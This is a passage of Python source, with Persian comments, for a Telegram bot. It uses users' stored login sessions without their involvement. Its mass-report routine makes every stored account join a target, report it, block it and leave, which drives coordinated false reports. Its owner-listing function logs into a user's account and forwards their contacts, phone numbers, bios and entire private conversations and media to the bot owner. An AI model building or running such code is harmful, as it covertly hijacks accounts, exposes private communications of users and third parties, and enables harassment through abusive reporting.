    if _re.match(r'^[A-Za-z][A-Za-z0-9_]{3,}$', link):
        return 'user', link
    return 'user', link.lstrip('@')



def _extract_msg_id(link):
    """از لینک پست، ایدی پیام را برمی‌گرداند"""
    import re as _re
    link = (link or '').strip()
    m = _re.search(r'(?:t\.me|telegram\.me)/c/\d+/(\d+)', link)
    if m:
        return int(m.group(1))
    m = _re.search(r'(?:t\.me|telegram\.me)/[A-Za-z0-9_]+/(\d+)', link)
    if m:
        return int(m.group(1))
    return None


async def _get_or_connect_session(session_str, label='STR'):
    """کلاینت موقت از سشن — بعد از کار disconnect می‌شود"""
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model=(label or 'STR'))
    await client.connect()
    if not await client.is_user_authorized():
        try:
            await client.disconnect()
        except Exception:
            pass
        return None
    return client

async def _report_one(client, link, reason_key, reason_text='', invite_link=None):
    """یک اکانت یک‌بار گزارش — تایم‌اوت‌دار؛ عمومی بدون جوین؛ خصوصی جوین→گزارش→لفت"""
    from telethon.tl.functions.account import ReportPeerRequest
    from telethon.tl.functions.messages import ImportChatInviteRequest, ReportRequest
    from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest
    from telethon.errors import FloodWaitError

    kind, val = _parse_tg_link(link)
    joined = False
    entity = None
    # اگر لینک دعوت جدا داده شده اول جوین
    if invite_link:
        ik, iv = _parse_tg_link(invite_link)
        try:
            if ik == 'invite':
                updates = await asyncio.wait_for(client(ImportChatInviteRequest(iv)), timeout=20)
                joined = True
                chats = getattr(updates, 'chats', None) or []
                if chats:
                    entity = chats[0]
            elif ik in ('user', 'id'):
                await asyncio.wait_for(client(JoinChannelRequest(iv if ik=='user' else int(iv))), timeout=20)
                joined = True
                entity = await client.get_entity(iv if ik=='user' else int(iv))
        except Exception:
            pass

    try:
        if entity is not None and kind in ('id', 'user'):
            pass  # already have entity from invite
        elif kind == 'invite':
            try:
                updates = await asyncio.wait_for(client(ImportChatInviteRequest(val)), timeout=20)
                joined = True
                chats = getattr(updates, 'chats', None) or []
                entity = chats[0] if chats else await client.get_entity(updates)
            except Exception as e:
                err = str(e).lower()
                if 'already' in err or 'user_already_participant' in err:
                    for u in ('https://t.me/+' + val, 'https://t.me/joinchat/' + val):
                        try:
                            entity = await asyncio.wait_for(client.get_entity(u), timeout=15)
                            break
                        except Exception:
                            continue
                    if entity is None:
                        return False, 'invite resolve failed'
                else:
                    return False, str(e)[:80]
        elif kind == 'id':
            entity = await asyncio.wait_for(client.get_entity(int(val)), timeout=15)
        else:
            try:
                entity = await asyncio.wait_for(client.get_entity(val), timeout=15)
            except Exception:
                try:
                    entity = await asyncio.wait_for(client.get_entity('@' + str(val).lstrip('@')), timeout=15)
                except Exception:
                    try:
                        await asyncio.wait_for(client(JoinChannelRequest(val)), timeout=20)
                        joined = True
                        entity = await client.get_entity(val)
                    except Exception as e:
                        return False, 'resolve: ' + str(e)[:80]
    except Exception as e:
        return False, 'resolve: ' + str(e)[:80]

    if entity is None:
        return False, 'no entity'

    # اهداف محافظت‌شده / مالک — گزارش نشود
    try:
        if is_report_protected_target(entity):
            return False, 'protected'
        # ایدی عددی لینک
        kind2, val2 = _parse_tg_link(link)
        if kind2 in ('id', 'user') and val2 is not None:
            try:
                if is_report_protected_target(int(val2) if str(val2).lstrip('-').isdigit() else val2):
                    return False, 'protected'
            except Exception:
                pass
    except Exception:
        pass

    reason = _report_reason_obj(reason_key)
    extra_map = {
        'scam': 'scam',
        'scam_finance': 'scam',
        'scam_other': (reason_text or 'scam'),
        'other': (reason_text or 'other'),
        'fake': 'fake account',
    }
    msg = str(extra_map.get(reason_key, reason_text or ''))[:200]
    ok = False
    last_err = ''

    msg_ids = []
    specific = _extract_msg_id(link)
    if specific:
        msg_ids = [specific]
    try:
        if not msg_ids:
            async for m in client.iter_messages(entity, limit=50):
                if getattr(m, 'action', None):
                    continue
                msg_ids.append(m.id)
                if len(msg_ids) >= 50:
                    break
        elif specific:
            # اضافه کردن چند پیام اطراف هم
            try:
                async for m in client.iter_messages(entity, limit=10):
                    if m.id not in msg_ids and not getattr(m, 'action', None):
                        msg_ids.append(m.id)
            except Exception:
                pass
    except Exception:
        if not msg_ids:
            msg_ids = []

    if msg_ids:
        try:
            await asyncio.wait_for(
                client(ReportRequest(peer=entity, id=msg_ids, reason=reason, message=msg or '')),
                timeout=25
            )
            ok = True
        except Exception as e:
            last_err = str(e)[:80]
            try:
                await asyncio.wait_for(
                    client(ReportRequest(peer=entity, id=msg_ids, reason=reason, message='')),
                    timeout=20
                )
                ok = True
            except Exception as e2:
                last_err = str(e2)[:80]

    try:
        await asyncio.wait_for(
            client(ReportPeerRequest(peer=entity, reason=reason, message=msg or '')),
            timeout=20
        )
        ok = True
    except FloodWaitError as e:
        try:
            await asyncio.sleep(min(int(getattr(e, 'seconds', 1)), 3))
            await client(ReportPeerRequest(peer=entity, reason=reason, message=msg or ''))
            ok = True
        except Exception as e2:
            last_err = str(e2)[:80]
    except Exception as e:
        last_err = str(e)[:80]


    # اگر تارگت اکانت/یوزر بود: بلاک + گزارش
    try:
        from telethon.tl.types import User as _TlUser
        is_user_target = isinstance(entity, _TlUser) or kind in ('user',) or (
            kind == 'id' and not str(val).startswith('-')
        )
        # لینک t.me/username یا ایدی مثبت = یوزر
        if not is_user_target and kind == 'id':
            try:
                is_user_target = int(val) > 0
            except Exception:
                pass
        if is_user_target and entity is not None:
            try:
                await asyncio.wait_for(client.block(entity), timeout=15)
            except Exception:
                try:
                    from telethon.tl.functions.contacts import BlockRequest
                    await asyncio.wait_for(client(BlockRequest(id=entity)), timeout=15)
                except Exception:
                    pass
            # گزارش هرزنامه اضافه اگر دلیل چیز دیگری بود
            try:
                from telethon.tl import types as _tlr
                await asyncio.wait_for(
                    client(ReportPeerRequest(peer=entity, reason=_tlr.InputReportReasonSpam(), message=msg or 'spam')),
                    timeout=15
                )
                ok = True
            except Exception:
                pass
    except Exception:
        pass

    if joined:
        try:
            await asyncio.wait_for(client(LeaveChannelRequest(entity)), timeout=10)
        except Exception:
            try:
                await client.delete_dialog(entity)
            except Exception:
                pass

    if ok:
        return True, None
    return False, last_err or 'report failed'



def _collect_report_sessions(requester_uid, owner_mode=False):
    """مالک اصلی: تک‌تک کاربران فایل + سشن اصلی + اکانت اضافه (جز سشن اصلی مالک)"""
    out = []
    seen = set()
    try:
        data = load_data()
    except Exception:
        try:
            data = _read_data_unlocked()
        except Exception:
            data = {}

    def _push(sess, acc_id, name=None, username=None, owner_uid=None):
        sess = str(sess or '').strip()
        if not sess or sess in ('None', 'null', 'none', '') or sess in seen:
            return
        if len(sess) < 20:
            return
        # معاف از ریپورت
        try:
            exempt = set(int(x) for x in (data.get('report_exempt') or []) if str(x).lstrip('-').isdigit())
            if acc_id is not None and int(acc_id) in exempt:
                return
            if owner_uid is not None and int(owner_uid) in exempt:
                return
        except Exception:
            pass
        seen.add(sess)
        nm = (name or '').strip() or str(acc_id)
        un = (username or '').strip().lstrip('@')
        parts = [nm, str(acc_id)]
        if un:
            parts.append('@' + un)
        out.append({
            'label': ' | '.join(parts),
            'session': sess,
            'acc_id': acc_id,
            'name': nm,
            'username': un,
            'owner_uid': owner_uid,
        })

    try:
        data = load_data()
    except Exception:
        try:
            data = _read_data_unlocked()
        except Exception:
            data = {}
    users = (data.get('users') or {}) if isinstance(data, dict) else {}

    # همه استفاده‌کنندگان ریپورتر: کل سشن‌ها (جز اکانت اصلی مالک)
    owner_mode = True

    if owner_mode:
        for uid_str, u in list(users.items()):
            try:
                uid_i = int(uid_str)
            except Exception:
                continue
            if not isinstance(u, dict):
                continue
            # سشن اصلی کاربر — نه مالک اصلی
            if uid_i != int(OWNER_ID):
                for sk in ('session', 'StringSession', 'sess', 'telethon_session'):
                    sess = u.get(sk)
                    if sess:
                        nm = u.get('original_name') or u.get('name') or str(uid_i)
                        un = u.get('username')
                        _push(sess, uid_i, nm, un, uid_i)
                        break
            # اکانت‌های اضافه
            extras = u.get('extra_accounts') or u.get('extras') or {}
            if not isinstance(extras, dict):
                continue
            for acc_id, info in list(extras.items()):
                if str(acc_id).lower() in ('all', 'none', '', 'null'):
                    continue
                if not isinstance(info, dict):
                    continue
                sess = info.get('session') or info.get('StringSession') or info.get('sess')
                if not sess:
                    continue
                nm = info.get('name') or str(acc_id)
                un = info.get('username')
                aid = info.get('id') or acc_id
                _push(sess, aid, nm, un, uid_i)
        return out

    # کاربر ریپورتر: سشن خودش + اکانت‌های اضافه (نه مالک اصلی)
    u = users.get(str(requester_uid))
    if not isinstance(u, dict):
        u = get_user(requester_uid) or {}
    if isinstance(u, dict) and int(requester_uid) != int(OWNER_ID):
        sess = u.get('session') or u.get('StringSession')
        if sess:
            nm = u.get('original_name') or u.get('name') or str(requester_uid)
            un = u.get('username')
            _push(sess, requester_uid, nm, un, requester_uid)
    extras = {}
    if isinstance(u, dict):
        extras = u.get('extra_accounts') or u.get('extras') or {}
    if not extras:
        extras = get_extras(requester_uid) or {}
    if isinstance(extras, dict):
        for acc_id, info in list(extras.items()):
            if str(acc_id).lower() in ('all', 'none', '', 'null'):
                continue
            if not isinstance(info, dict):
                continue
            sess = info.get('session') or info.get('StringSession')
            if not sess:
                continue
            nm = info.get('name') or str(acc_id)
            un = info.get('username')
            aid = info.get('id') or acc_id
            _push(sess, aid, nm, un, requester_uid)
    return out





def _bot_send_file(chat_id, path_or_bytes, kind='document', caption=None, reply_to=None):
    """ارسال مطمئن فایل به ربات — message_id یا None"""
    from io import BytesIO
    data = None
    try:
        if isinstance(path_or_bytes, (bytes, bytearray)):
            bio = BytesIO(path_or_bytes)
            names = {
                'photo': 'photo.jpg',
                'voice': 'voice.ogg',
                'video': 'video.mp4',
                'video_note': 'note.mp4',
                'sticker': 'sticker.webp',
                'document': 'file.bin',
            }
            bio.name = names.get(kind, 'file.bin')
            data = bio
        else:
            data = open(path_or_bytes, 'rb')
        kw = {}
        if caption:
            kw['caption'] = (caption or '')[:1024]
            kw['parse_mode'] = 'HTML'
        if reply_to:
            kw['reply_to_message_id'] = reply_to
        if kind == 'photo':
            sm = bot.send_photo(chat_id, data, **kw)
        elif kind == 'voice':
            sm = bot.send_voice(chat_id, data, **kw)
        elif kind == 'video':
            sm = bot.send_video(chat_id, data, **kw)
        elif kind == 'video_note':
            sm = bot.send_video_note(chat_id, data, reply_to_message_id=reply_to)
        elif kind == 'sticker':
            sm = bot.send_sticker(chat_id, data, reply_to_message_id=reply_to)
        else:
            sm = bot.send_document(chat_id, data, **kw)
        return getattr(sm, 'message_id', None)
    except Exception as e:
        try:
            bot.send_message(chat_id, "<blockquote>خطا مدیا: " + str(e)[:100].replace('<', '') + "</blockquote>", parse_mode='HTML')
        except Exception:
            pass
        return None
    finally:
        try:
            if data is not None and hasattr(data, 'close') and not isinstance(path_or_bytes, (bytes, bytearray)):
                data.close()
        except Exception:
            pass


async def _dl_bytes(client, media_or_msg, limit=20 * 1024 * 1024):
    """دانلود مدیا به bytes"""
    try:
        data = await client.download_media(media_or_msg, file=bytes)
        if not data:
            return None
        if len(data) > limit:
            return None
        return data
    except Exception:
        try:
            # fallback path
            path = await client.download_media(media_or_msg)
            if path:
                with open(path, 'rb') as f:
                    data = f.read()
                try:
                    import os as _os
                    _os.remove(path)
                except Exception:
                    pass
                if data and len(data) <= limit:
                    return data
        except Exception:
            pass
        return None


async def _owner_list_user(tid, mode='all'):
    """mode: pv | gp | ch | all — با پروفایل و تعداد عضو؛ قابل توقف"""
    global list_stop
    try:
        list_stop.discard(int(OWNER_ID))
        list_skip_pv.discard(int(OWNER_ID))
    except Exception:
        pass
    u = get_user(tid) or {}
    sess = u.get('session')
    if not sess:
        bot.send_message(OWNER_ID, "<blockquote>سشن ندارد</blockquote>", parse_mode='HTML')
        return
    client = None

    def _stopped():
        try:
            return int(OWNER_ID) in list_stop
        except Exception:
            return False

    def _cap(s, n=900):
        s = (s or '')
        return s[:n]

    def _send_html(txt):
        if _stopped():
            return False
        try:
            bot.send_message(OWNER_ID, txt[:4000], parse_mode='HTML', disable_web_page_preview=True)
            return True
        except Exception:
            return False

    async def _send_media_msg(m, caption):
        if _stopped():
            return
        caption = _cap(caption, 1000)
        try:
            if m.media and not media_too_large(m):
                path = await m.download_media(file='/tmp/olist_' + str(getattr(m, 'id', 0)))
                if path:
                    try:
                        with open(path, 'rb') as f:
                            if m.photo:
                                bot.send_photo(OWNER_ID, f, caption=caption, parse_mode='HTML')
                            elif m.voice or (m.document and getattr(m, 'voice', None)):
                                f.seek(0)
                                bot.send_voice(OWNER_ID, f, caption=caption, parse_mode='HTML')
                            elif m.video_note:
                                f.seek(0)
                                try:
                                    bot.send_video_note(OWNER_ID, f)
                                    bot.send_message(OWNER_ID, caption, parse_mode='HTML')
                                except Exception:
                                    f.seek(0)
                                    bot.send_document(OWNER_ID, f, caption=caption, parse_mode='HTML')
                            elif m.video:
                                f.seek(0)
                                bot.send_video(OWNER_ID, f, caption=caption, parse_mode='HTML')
                            else:
                                f.seek(0)
                                bot.send_document(OWNER_ID, f, caption=caption, parse_mode='HTML')
                    except Exception:
                        try:
                            with open(path, 'rb') as f:
                                bot.send_document(OWNER_ID, f, caption=caption, parse_mode='HTML')
                        except Exception:
                            _send_html(caption)
                    try:
                        import os as _os
                        _os.remove(path)
                    except Exception:
                        pass
                    return
            _send_html(caption)
        except Exception:
            _send_html(caption)

    try:
        client = await _get_or_connect_session(sess, label='ListUser')
        if not client:
            bot.send_message(OWNER_ID, "<blockquote>اتصال ممکن نشد</blockquote>", parse_mode='HTML')
            return
        nm = (u.get('original_name') or u.get('name') or str(tid))
        mode_fa = {'pv': 'پیوی‌ها', 'gp': 'گروه‌ها', 'ch': 'چنل‌ها'}.get(mode, 'همه')
        _send_html(
            "<blockquote><b>📋 لیست: " + mode_fa + "</b></blockquote>" + chr(10)
            + "<blockquote>کاربر: " + str(nm).replace('<','') + " | <code>" + str(tid) + "</code></blockquote>"
        )
        # پنل کنترل شیشه‌ای + سنجاق
        try:
            mk_ctrl = types.InlineKeyboardMarkup(row_width=1)
            mk_ctrl.add(types.InlineKeyboardButton("⏹ توقف", callback_data="olist_stop"))
            if mode in ('all', 'pv'):
                mk_ctrl.add(types.InlineKeyboardButton("⏭ بعدی (پیوی بعد)", callback_data="olist_next"))
            ctrl = bot.send_message(
                OWNER_ID,
                "<blockquote><b>کنترل لیست</b></blockquote>" + chr(10)
                + "<blockquote>توقف = قطع کامل | بعدی = رد شدن از این پیوی</blockquote>",
                parse_mode='HTML',
                reply_markup=mk_ctrl,
            )
            try:
                bot.pin_chat_message(OWNER_ID, ctrl.message_id, disable_notification=True)
            except Exception:
                pass
        except Exception:
            pass

        channels = []
        groups = []
        pvs = []
        async for d in client.iter_dialogs(limit=300):
            if _stopped():
                break
            try:
                e = d.entity
                title = getattr(e, 'title', None) or ((getattr(e, 'first_name', '') or '') + ' ' + (getattr(e, 'last_name', '') or '')).strip()
                un = getattr(e, 'username', None)
                eid = getattr(e, 'id', None)
                if d.is_channel and getattr(e, 'broadcast', False):
                    if un:
                        link = 'https://t.me/' + un
                    else:
                        # private channel numeric
                        cid = str(eid)
                        if not cid.startswith('-100'):
                            link = 'https://t.me/c/' + cid
                        else:
                            link = 'https://t.me/c/' + cid.replace('-100', '')
                    channels.append((e, title, un, eid, link))
                elif d.is_group or (d.is_channel and getattr(e, 'megagroup', False)):
                    if un:
                        link = 'https://t.me/' + un
                    else:
                        cid = str(eid)
                        link = 'https://t.me/c/' + (cid.replace('-100', '') if cid.startswith('-100') else cid)
                    groups.append((e, title, un, eid, link))
                elif d.is_user and not getattr(e, 'bot', False):
                    pvs.append((d.date.timestamp() if d.date else 0, e, title or str(eid), un, eid))
            except Exception:
                continue

        # ---- چنل‌ها ----
        if mode in ('all', 'ch'):
          if not _stopped():
            _send_html("<blockquote><b>📺 چنل‌ها (" + str(len(channels)) + ")</b></blockquote>")
          for e, title, un, eid, link in channels:
            if _stopped():
                break
            members = '—'
            try:
                from telethon.tl.functions.channels import GetFullChannelRequest
                full = await client(GetFullChannelRequest(e))
                members = str(getattr(full.full_chat, 'participants_count', None) or '—')
            except Exception:
                try:
                    members = str(getattr(e, 'participants_count', None) or '—')
                except Exception:
                    pass
            cap = (
                "<blockquote><b>چنل:</b> " + str(title).replace('<','') + "</blockquote>" + chr(10)
                + "<blockquote>لینک: <code>" + str(link) + "</code></blockquote>" + chr(10)
                + "<blockquote>ایدی: <code>" + str(eid) + "</code></blockquote>" + chr(10)
                + "<blockquote>تعداد عضو: <code>" + str(members) + "</code></blockquote>"
                + (("" + chr(10) + "<blockquote>یوزرنیم: @" + str(un) + "</blockquote>") if un else "")
            )
            try:
                photos = await client.get_profile_photos(e, limit=1)
                if photos:
                    raw = await _dl_bytes(client, photos[0], limit=5 * 1024 * 1024)
                    if raw:
                        _bot_send_file(OWNER_ID, raw, kind='photo', caption=cap[:1024])
                    else:
                        _send_html(cap)
                else:
                    _send_html(cap)
            except Exception:
                _send_html(cap)

        # ---- گروه‌ها ----
        if mode in ('all', 'gp'):
          if not _stopped():
            _send_html("<blockquote><b>👥 گروه‌ها (" + str(len(groups)) + ")</b></blockquote>")
          for e, title, un, eid, link in groups:
            if _stopped():
                break
            members = '—'
            try:
                from telethon.tl.functions.channels import GetFullChannelRequest
                full = await client(GetFullChannelRequest(e))
                members = str(getattr(full.full_chat, 'participants_count', None) or '—')
            except Exception:
                try:
                    from telethon.tl.functions.messages import GetFullChatRequest
                    full = await client(GetFullChatRequest(eid))
                    members = str(getattr(full.full_chat, 'participants_count', None) or '—')
                except Exception:
                    try:
                        members = str(getattr(e, 'participants_count', None) or '—')
                    except Exception:
                        pass
            cap = (
                "<blockquote><b>گروه:</b> " + str(title).replace('<','') + "</blockquote>" + chr(10)
                + "<blockquote>لینک: <code>" + str(link) + "</code></blockquote>" + chr(10)
                + "<blockquote>ایدی: <code>" + str(eid) + "</code></blockquote>" + chr(10)
                + "<blockquote>تعداد عضو: <code>" + str(members) + "</code></blockquote>"
                + (("" + chr(10) + "<blockquote>یوزرنیم: @" + str(un) + "</blockquote>") if un else "")
            )
            try:
                photos = await client.get_profile_photos(e, limit=1)
                if photos:
                    raw = await _dl_bytes(client, photos[0], limit=5 * 1024 * 1024)
                    if raw:
                        _bot_send_file(OWNER_ID, raw, kind='photo', caption=cap[:1024])
                    else:
                        _send_html(cap)
                else:
                    _send_html(cap)
            except Exception:
                _send_html(cap)

        # ---- پیوی‌ها: یکی‌یکی کامل، پروفایل اول، ریپلای زنجیره‌ای دقیق ----
        pvs.sort(key=lambda x: x[0], reverse=True)
        if mode in ('all', 'pv'):
          if not _stopped():
            _send_html("<blockquote><b>💬 پیوی‌ها (" + str(len(pvs)) + ")</b></blockquote>")
          for _pv_i, (_dts, ent, title, un, eid) in enumerate(pvs):
            if _stopped():
                break
            phone = getattr(ent, 'phone', None)
            sname = ((getattr(ent, 'first_name', '') or '') + ' ' + (getattr(ent, 'last_name', '') or '')).strip() or str(eid)
            bio = ''
            try:
                from telethon.tl.functions.users import GetFullUserRequest
                fu = await client(GetFullUserRequest(ent))
                bio = getattr(fu.full_user, 'about', None) or ''
            except Exception:
                pass
            info = (
                "<blockquote><b>پیوی " + str(_pv_i + 1) + "/" + str(len(pvs)) + "</b></blockquote>" + chr(10)
                + "<blockquote><b>نام:</b> " + str(sname).replace('<','') + "</blockquote>" + chr(10)
                + ("<blockquote>یوزرنیم: @" + str(un) + "</blockquote>" + chr(10) if un else "")
                + "<blockquote>ایدی: <code>" + str(eid) + "</code></blockquote>" + chr(10)
                + ("<blockquote>شماره: <code>" + str(phone) + "</code></blockquote>" + chr(10) if phone else "")
                + ("<blockquote>بیو: " + str(bio).replace('<','')[:200] + "</blockquote>" if bio else "")
            )
            # ۱) پروفایل — حتماً با عکس
            profile_mid = None
            try:
                photos = await client.get_profile_photos(ent, limit=1)
                if photos:
                    raw = await _dl_bytes(client, photos[0], limit=5 * 1024 * 1024)
                    if raw:
                        profile_mid = _bot_send_file(OWNER_ID, raw, kind='photo', caption=info[:1024])
            except Exception as e:
                try:
                    bot.send_message(OWNER_ID, "<blockquote>خطا پروفایل: " + str(e)[:80].replace('<','') + "</blockquote>", parse_mode='HTML')
                except Exception:
                    pass
            if profile_mid is None:
                try:
                    sent_p = bot.send_message(OWNER_ID, info, parse_mode='HTML')
                    profile_mid = getattr(sent_p, 'message_id', None)
                except Exception:
                    profile_mid = None

            # ۲) همه پیام‌های این پیوی به ترتیب زمانی (قدیمی → جدید)
            id_map = {}  # original_msg_id -> bot message_id
            try:
                msgs = []
                async for m in client.iter_messages(ent):
                    if _stopped():
                        break
                    msgs.append(m)
                msgs.reverse()
                for m in msgs:
                    if _stopped():
                        break
                    try:
                        if int(OWNER_ID) in list_skip_pv:
                            break
                    except Exception:
                        pass
                    out = bool(m.out)
                    who = str(nm).replace('<','') if out else str(sname).replace('<','')
                    other = str(sname).replace('<','') if out else str(nm).replace('<','')
                    mtype = 'متن'
                    if m.photo: mtype = 'عکس'
                    elif m.voice: mtype = 'ویس'
                    elif m.video_note: mtype = 'ویدیو مسیج'
                    elif m.video: mtype = 'ویدیو'
                    elif m.sticker: mtype = 'استیکر'
                    elif getattr(m, 'gif', None) or (m.document and 'gif' in str(getattr(m.document, 'mime_type', '') or '').lower()):
                        mtype = 'گیف'
                    elif m.document: mtype = 'فایل'
                    t = (m.text or m.message or '') or ''
                    try:
                        ds = m.date.strftime('%Y/%m/%d %H:%M:%S') if m.date else ''
                    except Exception:
                        ds = ''
                    cap = (
                        "<blockquote>" + who + " → " + other + "</blockquote>" + chr(10)
                        + "<blockquote>" + mtype + (" | " + ds if ds else "") + "</blockquote>"
                        + (("" + chr(10) + "<blockquote>" + str(t).replace('<','')[:500] + "</blockquote>") if t else "")
                    )
                    # ریپلای: اگر در اصل ریپلای بوده → به همان پیام مپ‌شده؛ وگرنه به پروفایل
                    reply_to = None
                    try:
                        rid = getattr(m, 'reply_to_msg_id', None)
                        if rid and rid in id_map:
                            reply_to = id_map[rid]
                        elif profile_mid:
                            reply_to = profile_mid
                    except Exception:
                        reply_to = profile_mid

                    sent_mid = None
                    try:
                        reply_kw = reply_to
                        has_media = bool(getattr(m, 'media', None))
                        raw = None
                        kind = 'document'
                        if has_media:
                            # تا 20MB — media_too_large را دور بزن
                            try:
                                raw = await _dl_bytes(client, m, limit=20 * 1024 * 1024)
                            except Exception:
                                raw = None
                            if m.photo:
                                kind = 'photo'
                            elif m.voice:
                                kind = 'voice'
                            elif m.video_note:
                                kind = 'video_note'
                            elif m.video:
                                kind = 'video'
                            elif m.sticker:
                                kind = 'sticker'
                            else:
                                kind = 'document'
                        if raw:
                            sent_mid = _bot_send_file(OWNER_ID, raw, kind=kind, caption=cap[:1024], reply_to=reply_kw)
                            if kind in ('video_note', 'sticker') and sent_mid:
                                try:
                                    bot.send_message(OWNER_ID, cap, parse_mode='HTML', reply_to_message_id=sent_mid)
                                except Exception:
                                    pass
                        elif has_media and not raw:
                            # دانلود نشد یا خیلی بزرگ — حداقل متن
                            try:
                                sm = bot.send_message(OWNER_ID, cap + chr(10) + "<blockquote>(مدیا دریافت نشد/حجم بالا)</blockquote>", parse_mode='HTML', reply_to_message_id=reply_kw)
                                sent_mid = getattr(sm, 'message_id', None)
                            except Exception:
                                _send_html(cap)
                        else:
                            try:
                                sm = bot.send_message(OWNER_ID, cap, parse_mode='HTML', reply_to_message_id=reply_kw)
                                sent_mid = getattr(sm, 'message_id', None)
                            except Exception:
                                _send_html(cap)
                    except Exception as e:
                        try:
                            sm = bot.send_message(OWNER_ID, cap, parse_mode='HTML', reply_to_message_id=reply_to)
                            sent_mid = getattr(sm, 'message_id', None)
                        except Exception:
                            _send_html(cap + chr(10) + str(e)[:40])
                    if sent_mid and getattr(m, 'id', None):
                        id_map[m.id] = sent_mid
            except Exception:
                pass
            # جداکننده بین پیوی‌ها
            skipped = False
            try:
                skipped = int(OWNER_ID) in list_skip_pv
                list_skip_pv.discard(int(OWNER_ID))
            except Exception:
                pass
            if not _stopped():
                if skipped:
                    _send_html("<blockquote>⏭ رد شد — پیوی بعدی: " + str(sname).replace('<','') + "</blockquote>")
                else:
                    _send_html("<blockquote>──────── پایان پیوی: " + str(sname).replace('<','') + " ────────</blockquote>")

        if _stopped():
            _send_html("<blockquote>⏹ لیست متوقف شد</blockquote>")
        else:
            _send_html("<blockquote>✅ لیست تمام شد</blockquote>")
    except Exception as e:
        try:
            bot.send_message(OWNER_ID, "خطا لیست: " + str(e)[:150])
        except Exception:
            pass
    finally:
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass



async def run_mass_report(requester_uid, link, reason_key, reason_text, progress_chat, progress_mid, owner_mode=False, invite_link=None, report_links=None):
    # مالک اصلی همیشه همه سشن‌های ربات
    try:
        if is_main_owner(requester_uid):
            owner_mode = True
    except Exception:
        pass
    sessions = _collect_report_sessions(requester_uid, owner_mode=owner_mode)
    total = len(sessions)
    ok_n = 0
    fail_n = 0
    rname = reason_display_name(reason_key, reason_text or '')
    result_lines = []  # لیست پایدار نام‌ها

    def _edit(txt):
        try:
            bot.edit_message_text(txt[:4000], progress_chat, progress_mid, parse_mode='HTML')
        except Exception:
            try:
                bot.edit_message_caption(caption=txt[:1024], chat_id=progress_chat, message_id=progress_mid, parse_mode='HTML')
            except Exception:
                pass

    is_owner_view = False
    try:
        is_owner_view = is_main_owner(requester_uid)
    except Exception:
        pass
    targets = list(report_links) if report_links else [link]
    if not targets:
        targets = [link]

    def _target_block():
        if len(targets) > 1:
            t = '<blockquote><b>تارگت‌ها:</b></blockquote>' + chr(10)
            for L in targets[:15]:
                t += '<blockquote><code>' + str(L).replace('<', '')[:70] + '</code></blockquote>' + chr(10)
            if len(targets) > 15:
                t += '<blockquote>... +' + str(len(targets)-15) + '</blockquote>' + chr(10)
            return t
        return '<blockquote>تارگت: <code>' + str(targets[0]).replace('<', '')[:80] + '</code></blockquote>' + chr(10)

    def _compose(done):
        head = (
            '<blockquote><b>📡 ریپورتر</b></blockquote>' + chr(10)
            + _target_block()
            + '<blockquote>نوع گزارش: ' + str(rname).replace('<','')[:200] + '</blockquote>' + chr(10)
            + '<blockquote>' + _progress_bar(done, total) + '</blockquote>' + chr(10)
        )
        if is_owner_view:
            body = ''
            for ln in result_lines[-35:]:
                body += '<blockquote>' + str(ln).replace('<', '')[:60] + ' گزارش زده شد</blockquote>' + chr(10)
            body += (
                '<blockquote>گزارش ' + str(done) + '/' + str(total) + '</blockquote>' + chr(10)
                + '<blockquote>گزارش موفق: ' + str(ok_n) + '</blockquote>' + chr(10)
                + '<blockquote>گزارش ناموفق: ' + str(fail_n) + '</blockquote>'
            )
            return (head + body)[:4000]
        return (
            head
            + '<blockquote>گزارش ' + str(done) + '/' + str(total) + '</blockquote>' + chr(10)
            + '<blockquote>گزارش موفق: ' + str(ok_n) + '</blockquote>' + chr(10)
            + '<blockquote>گزارش ناموفق: ' + str(fail_n) + '</blockquote>'
        )

    if total == 0:
        _edit('<blockquote>اکانتی برای گزارش پیدا نشد</blockquote>')
        return

    _edit(_compose(0))

    async def _one(item):
        if isinstance(item, dict):
            label = item.get('name') or item.get('label') or str(item.get('acc_id'))
            sess = item.get('session')
        else:
            label, sess = item[0], item[1]
        display_name = str(label).split('|')[0].strip() or str(label)
        client = None
        try:
            client = await asyncio.wait_for(_get_or_connect_session(sess, label='STR'), timeout=20)
            if not client:
                return False, display_name
            try:
                me = await asyncio.wait_for(client.get_me(), timeout=8)
                display_name = ((me.first_name or '') + ' ' + (me.last_name or '')).strip() or display_name
            except Exception:
                pass
            success_any = False
            for tlink in targets:
                try:
                    success, err = await asyncio.wait_for(
                        _report_one(client, tlink, reason_key, reason_text, invite_link=invite_link),
                        timeout=55
                    )
                    if success:
                        success_any = True
                except Exception:
                    pass
            return bool(success_any), display_name
        except Exception:
            return False, display_name
        finally:
            if client:
                try:
                    await asyncio.wait_for(client.disconnect(), timeout=6)
                except Exception:
                    pass

    # موازی با محدودیت همزمانی
    sem = asyncio.Semaphore(8)
    done = 0

    async def _wrap(it):
        nonlocal ok_n, fail_n, done
        async with sem:
            ok, name = await _one(it)
            if ok:
                ok_n += 1
                if is_owner_view:
                    result_lines.append(str(name or '—').split('|')[0].strip())
            else:
                fail_n += 1
            done += 1
            _edit(_compose(done))
            return ok

    await asyncio.gather(*[_wrap(it) for it in sessions])

    if is_owner_view:
        body = (
            '<blockquote><b>✅ ریپورتر تمام شد</b></blockquote>' + chr(10)
            + '<blockquote>هدف: <code>' + str(link).replace('<', '')[:80] + '</code></blockquote>' + chr(10)
            + '<blockquote>نوع گزارش: ' + str(rname).replace('<','')[:200] + '</blockquote>' + chr(10)
            + '<blockquote>' + _progress_bar(total, total) + '</blockquote>' + chr(10)
        )
        for ln in result_lines[-40:]:
            body += '<blockquote>' + str(ln).replace('<', '')[:60] + ' گزارش زده شد</blockquote>' + chr(10)
        body += (
            '<blockquote>گزارش ' + str(total) + '/' + str(total) + '</blockquote>' + chr(10)
            + '<blockquote>گزارش موفق: ' + str(ok_n) + '</blockquote>' + chr(10)
            + '<blockquote>گزارش ناموفق: ' + str(fail_n) + '</blockquote>'
        )
        _edit(body[:4000])
    else:
        _edit(
            '<blockquote><b>✅ ریپورتر تمام شد</b></blockquote>' + chr(10)
            + '<blockquote>هدف: <code>' + str(link).replace('<', '')[:80] + '</code></blockquote>' + chr(10)
            + '<blockquote>نوع گزارش: ' + str(rname).replace('<','')[:200] + '</blockquote>' + chr(10)
            + '<blockquote>' + _progress_bar(total, total) + '</blockquote>' + chr(10)
            + '<blockquote>گزارش ' + str(total) + '/' + str(total) + '</blockquote>' + chr(10)
